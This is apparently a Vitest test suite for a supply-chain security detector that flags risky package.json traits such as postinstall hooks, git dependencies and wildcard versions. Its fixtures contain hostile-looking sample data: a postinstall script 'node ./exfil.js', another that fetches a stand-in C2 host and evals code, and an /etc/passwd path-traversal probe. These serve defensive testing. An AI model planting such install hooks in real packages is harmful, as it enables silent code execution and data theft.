import { describe, it, expect, afterEach } from 'vitest';
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { SecuritySignalDetector } from '../../src/security/signal-detector.js';

/** Helper: create a temp project dir, write files, return dir path */
function createTmpProject(files: Record<string, string>): string {
  const dir = join(tmpdir(), `sova-signal-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  mkdirSync(dir, { recursive: true });
  for (const [relPath, content] of Object.entries(files)) {
    const fullPath = join(dir, relPath);
    mkdirSync(join(fullPath, '..'), { recursive: true });
    writeFileSync(fullPath, content, 'utf-8');
  }
  return dir;
}

const tmpDirs: string[] = [];

afterEach(() => {
  for (const dir of tmpDirs) {
    if (existsSync(dir)) rmSync(dir, { recursive: true, force: true });
  }
  tmpDirs.length = 0;
});

describe('SecuritySignalDetector', () => {
  it('returns zero signals for empty file list', async () => {
    const detector = new SecuritySignalDetector();
    const result = await detector.detect([], '/some/dir');
    expect(result.totalSignals).toBe(0);
    expect(result.signals).toHaveLength(0);
  });

  it('returns zero signals for unsupported language', async () => {
    const dir = createTmpProject({ 'some.unknownlang': 'content' });
    tmpDirs.push(dir);
    const detector = new SecuritySignalDetector();
    const result = await detector.detect(
      [{ path: join(dir, 'some.unknownlang'), language: 'unknownlang' }],
      dir,
    );
    expect(result.totalSignals).toBe(0);
  });

  it('detects postinstall script in package.json', async () => {
    const pkgContent = JSON.stringify({
      name: 'evil-pkg',
      version: '1.0.0',
      author: 'Alice',
      repository: 'https://github.com/alice/evil-pkg',
      scripts: { postinstall: 'node ./exfil.js' },
    });
    const dir = createTmpProject({ 'package.json': pkgContent });
    tmpDirs.push(dir);

    const detector = new SecuritySignalDetector();
    const filePath = join(dir, 'package.json');
    const result = await detector.detect(
      [{ path: filePath, language: 'javascript' }],
      dir,
    );

    expect(result.totalSignals).toBeGreaterThan(0);
    expect(result.critical).toBeGreaterThan(0);
    expect(result.signals.some(s => s.type === 'postinstall-script')).toBe(true);
  });

  it('detects git URL dependency', async () => {
    const pkgContent = JSON.stringify({
      name: 'test-pkg',
      version: '1.0.0',
      author: 'Alice',
      repository: 'https://github.com/alice/test-pkg',
      dependencies: { 'private-dep': 'git+https://github.com/org/private' },
    });
    const dir = createTmpProject({ 'package.json': pkgContent });
    tmpDirs.push(dir);

    const detector = new SecuritySignalDetector();
    const filePath = join(dir, 'package.json');
    const result = await detector.detect(
      [{ path: filePath, language: 'javascript' }],
      dir,
    );

    expect(result.high).toBeGreaterThan(0);
    expect(result.signals.some(s => s.type === 'git-url-dependency')).toBe(true);
  });

  it('returns zero signals for clean package.json', async () => {
    const pkgContent = JSON.stringify({
      name: 'clean-pkg',
      version: '1.0.0',
      author: 'Alice',
      repository: 'https://github.com/alice/clean-pkg',
      dependencies: {
        express: '^4.18.0',
        lodash: '4.17.21',
      },
    });
    const dir = createTmpProject({ 'package.json': pkgContent });
    tmpDirs.push(dir);

    const detector = new SecuritySignalDetector();
    const filePath = join(dir, 'package.json');
    const result = await detector.detect(
      [{ path: filePath, language: 'javascript' }],
      dir,
    );

    expect(result.totalSignals).toBe(0);
  });

  it('skips file that does not exist (no crash)', async () => {
    const detector = new SecuritySignalDetector();
    const result = await detector.detect(
      [{ path: '/nonexistent/path/package.json', language: 'javascript' }],
      '/nonexistent',
    );
    expect(result.totalSignals).toBe(0);
  });

  it('summarizes severity counts correctly', async () => {
    const pkgContent = JSON.stringify({
      name: 'noisy-pkg',
      version: '1.0.0',
      // no author, no repo → low signals
      scripts: { postinstall: "fetch('http://c2.io'); eval(x)" }, // critical
      dependencies: { dep: '*' }, // medium
    });
    const dir = createTmpProject({ 'package.json': pkgContent });
    tmpDirs.push(dir);

    const detector = new SecuritySignalDetector();
    const filePath = join(dir, 'package.json');
    const result = await detector.detect(
      [{ path: filePath, language: 'javascript' }],
      dir,
    );

    expect(result.totalSignals).toBe(result.critical + result.high + result.medium + result.low);
    expect(result.critical).toBeGreaterThan(0);
    expect(result.medium).toBeGreaterThan(0);
    expect(result.low).toBeGreaterThan(0);
  });

  it('returns zero signals for absolute path outside rootDir (path traversal prevention)', async () => {
    const detector = new SecuritySignalDetector();
    // Provide a file path that resolves outside the declared rootDir
    const result = await detector.detect(
      [{ path: '/etc/passwd', language: 'javascript' }],
      '/tmp/safe-root',
    );
    // Should produce 0 signals — the file is skipped rather than read
    expect(result.totalSignals).toBe(0);
  });

  it('reuses cached detector for same language across multiple files', async () => {
    const pkg1 = JSON.stringify({
      name: 'pkg1', version: '1.0.0', author: 'A', repository: 'https://github.com/a/p',
      dependencies: { lib: '*' },
    });
    const pkg2 = JSON.stringify({
      name: 'pkg2', version: '2.0.0', author: 'A', repository: 'https://github.com/a/p2',
      dependencies: { other: 'latest' },
    });
    const dir = createTmpProject({
      'sub1/package.json': pkg1,
      'sub2/package.json': pkg2,
    });
    tmpDirs.push(dir);

    const detector = new SecuritySignalDetector();
    const result = await detector.detect(
      [
        { path: join(dir, 'sub1/package.json'), language: 'javascript' },
        { path: join(dir, 'sub2/package.json'), language: 'javascript' },
      ],
      dir,
    );

    // Both have wildcard versions
    const wildcards = result.signals.filter(s => s.type === 'wildcard-version');
    expect(wildcards.length).toBeGreaterThanOrEqual(2);
  });
});
